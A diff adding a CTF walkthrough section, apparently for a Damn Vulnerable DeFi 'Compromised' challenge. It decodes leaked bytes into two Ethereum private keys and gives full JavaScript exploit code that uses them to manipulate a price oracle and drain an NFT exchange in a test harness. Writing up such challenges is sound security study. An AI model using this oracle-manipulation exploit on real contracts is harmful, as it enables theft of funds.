@@ -358,3 +358,84 @@ This time, we have to make two transactions. The first will queue the action to 
     // in a real-life event, this value can be read from the blockchain
     await this.governance.executeAction(1);
 ```
+
+## Challenge #7 - Compromised
+
+This one is a bit different. Although the title itself is a big hint. We say a private key is compromised, when an unauthorized entity determines what the private key is. The server response is returning a sequence of bytes. In JavaScript this can be represented by a [Buffer](https://nodejs.org/api/buffer.html#buffer). The only way to tackle this challenge is to guess. We can try to manipulate the data and hope to get something interesting.
+
+### Solution
+
+We have two lines of bytes sequences. Let's decode them:<br/>
+
+```
+First sequence: 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+Second sequence: 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+```
+
+After decoding it we get this string:<br/>
+
+```
+First hex: MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
+Second hex: MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
+```
+
+This looks like a base64 string. Let's decode it again. We get this:<br/>
+
+```
+First private key: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+Second private key: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+```
+
+No we have 2 64 hex characters strings (excluding the `0x`) which means we have 32 bytes strings. An ethereum private key has the length of 32 bytes. To [create an account](https://ethereum.org/en/developers/docs/accounts/#account-creation), the public key (account's address) is generated from the private key using the Elliptic Curve Digital Signature Algorithm, also known as `secp256k1` curve. You get a public address for your account by taking the last 20 bytes of the `keccak256` hash of the public key and adding `0x` to the beginning.
+
+Ethers allows us to create a wallet by giving it a private key (optionally add a provider to enable making transactions). The generated public keys are the following:
+
+```
+First public key: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
+Second public key: 0x81A5D6E50C214044bE44cA0CB057fe119097850c
+```
+
+Now we have two of the three trusted reporters. This means we override the NFT price. Here's the code:
+
+```js:test/compromised/compromised.challenge.js
+    /** CODE YOUR EXPLOIT HERE */
+    const serverResponse = [
+        "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35",
+        "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"
+    ];
+
+    // get wallets
+    const compromisedWallets = [];
+    for (let i = 0; i < serverResponse.length; i++) {
+        const res = serverResponse[i];
+        const sanitizedResponse = res.replaceAll(" ", "");
+        const encodedPrivateKeyAsBytes64 = Buffer.from(sanitizedResponse, `hex`).toString(`utf8`);
+        const privateKey = Buffer.from(encodedPrivateKeyAsBytes64, `base64`).toString(`utf8`);
+        compromisedWallets.push(new ethers.Wallet(privateKey, ethers.provider));
+
+        // reduce price to 0 because exchange pays back the price difference, so we can maximize our profits
+        await this.oracle.connect(compromisedWallets[i])
+                        .postPrice("DVNFT", 0);
+    }
+
+    // buy a DVNFT, pay more than 0 because exchange does not accept a payment of 0 ETH
+    await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther("0.01")});
+
+    // change price to initial exchange balance to drain its funds
+    for (let i = 0; i < compromisedWallets.length; i++) {
+        await this.oracle.connect(compromisedWallets[i])
+                        .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+    }
+
+    // sell the DVNFT
+    const tokenId = 0;
+    await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+    await this.exchange.connect(attacker).sellOne(tokenId);
+
+    // change price to initial NFT price to pass the last test check
+    for (let i = 0; i < compromisedWallets.length; i++) {
+        await this.oracle.connect(compromisedWallets[i])
+                        .postPrice("DVNFT", INITIAL_NFT_PRICE);
+    }
+```
